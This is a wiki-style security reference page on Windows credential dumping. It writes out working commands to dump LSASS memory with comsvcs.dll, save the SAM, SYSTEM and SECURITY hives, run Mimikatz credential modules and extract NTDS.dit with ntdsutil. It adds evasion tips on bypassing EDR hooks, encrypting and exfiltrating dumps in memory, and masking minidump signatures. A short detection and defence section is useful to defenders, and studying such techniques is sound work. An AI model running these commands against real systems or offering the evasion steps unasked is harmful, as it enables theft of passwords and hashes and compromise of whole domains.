---
title: Credential dumping
slug: credential-dumping
---

> **TL;DR:** Pull plaintext passwords, NT hashes, Kerberos tickets, and DPAPI material from LSASS, the SAM/SYSTEM hives, LSA registry, browser stores, and credential vaults — usually requires SYSTEM or SeDebugPrivilege.

## What it is
"Credential dumping" is the umbrella for techniques that recover secrets cached on a Windows host so the attacker can authenticate as that user elsewhere (pass-the-hash, overpass-the-hash, ticket replay, cleartext reuse). Most primitives boil down to reading protected memory (LSASS), reading hive files (SAM/SYSTEM/SECURITY), or decrypting DPAPI blobs with the right masterkey.

## Preconditions / where it applies
- Local administrator or SYSTEM on the target host (most paths)
- SeDebugPrivilege to open a handle to `lsass.exe` with `PROCESS_VM_READ`
- Disk access (or VSS snapshot rights) for offline hive dumping
- Domain-joined host for cached domain credentials and Kerberos artefacts

## Technique
LSASS memory dump — produce a minidump and parse it offline so the parsing tooling never touches the box.

```cmd
:: From an elevated prompt — built-in MiniDumpWriteDump via comsvcs.dll
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID_of_lsass> C:\Windows\Temp\l.dmp full
```

Then parse offline with pypykatz or Mimikatz `sekurlsa::minidump`.

For better OPSEC than `comsvcs.dll` (now signature-flagged), call `PssCaptureSnapshot` first and dump the snapshot handle — `procdump.exe -r <pid>` does exactly this, and EDRs that hook only `MiniDumpWriteDump` reading directly from lsass.exe miss it because the dump reads from the snapshot clone. Use a `MINIDUMP_CALLBACK_INFORMATION` routine to keep the ~50-100 MB dump in heap memory (encrypt + exfil over the network) instead of touching disk, which removes the most reliable IoC. Magic bytes at the start of any minidump are `MDMP` — strip or XOR them in transit if you must drop the file.

SAM + SYSTEM hives — local account NT hashes live in the SAM hive, decrypted with the SYSKEY from SYSTEM.

```cmd
reg save HKLM\SAM    C:\Windows\Temp\sam.sav
reg save HKLM\SYSTEM C:\Windows\Temp\sys.sav
reg save HKLM\SECURITY C:\Windows\Temp\sec.sav
```

Parse with `secretsdump.py -sam sam.sav -system sys.sav -security sec.sav LOCAL`. The SECURITY hive gives cached domain logons (DCC2 / "mscash2") and [[lsa-secrets]].

Live secrets — `lsadump::sam`, `lsadump::secrets`, `sekurlsa::logonpasswords`, `sekurlsa::tickets /export` from Mimikatz on a privileged session.

Vaults and browsers — Chromium-family browsers, Outlook profiles, RDP saved creds, WiFi profiles all chain through [[dpapi-secrets]] and need either user-context execution or the masterkey + protected-user secret.

NTDS.dit — on a DC, dump the AD database via `ntdsutil "ac i ntds" "ifm" "cr fu C:\t" q q` and parse `NTDS.dit` + `SYSTEM` with secretsdump for every domain hash including `krbtgt`.

## Detection and defence
- LSASS handle opens with `0x1010` / `0x1410` access masks — Sysmon event 10, EDR userland hooks, PPL/RunAsPPL on LSASS
- Credential Guard isolates LSA secrets in a VTL1 trustlet — sekurlsa returns empty results
- Sensitive registry hive saves trigger event 4688 + command-line auditing; alert on `reg save` of SAM/SYSTEM/SECURITY
- Restrict local admin (LAPS), enforce Protected Users group, disable WDigest, set `UseLogonCredential=0`
- Volume Shadow Copy creation from non-admin tooling is a high-signal indicator

## References
- [MITRE ATT&CK T1003](https://attack.mitre.org/techniques/T1003/) — credential access techniques
- [HackTricks — credentials protections](https://book.hacktricks.wiki/en/windows-hardening/stealing-credentials/credentials-protections.html) — overview of LSA / Credential Guard
- [Impacket secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) — canonical offline parser
- [ired.team — Dumping LSASS without Mimikatz (MiniDumpWriteDump)](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass) — custom dumper + PssCaptureSnapshot for AV-signature evasion
